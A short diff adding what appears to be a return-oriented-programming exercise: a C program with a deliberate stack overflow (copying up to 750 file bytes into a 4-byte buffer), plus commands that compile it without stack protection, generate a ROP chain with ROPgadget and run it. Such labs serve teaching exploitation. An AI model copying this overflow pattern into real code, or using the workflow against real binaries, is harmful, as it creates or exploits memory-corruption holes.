@@ -1,0 +1,24 @@
+############ROP##############
+#include <string.h>
+#include <stdio.h>
+
+void overflow (void* inbuf, int inbuflen)
+{
+  char buf[4];
+  memcpy(buf, inbuf, inbuflen);
+}
+
+int main (int argc, char** argv)
+{
+  char filebuf[750];
+  FILE* file = fopen(argv[1], "rb");
+  int bytes = fread(filebuf, sizeof(char), 750, file);
+  fclose(file);
+  overflow(filebuf, bytes);
+  return 0;
+}
+
+gcc --static -fno-stack-protector -z execstack -o vul1 vul.c
+ROPgadget --ropchain --binary vul1 > vul_r
+python2 vul_r
+./vul1 rop
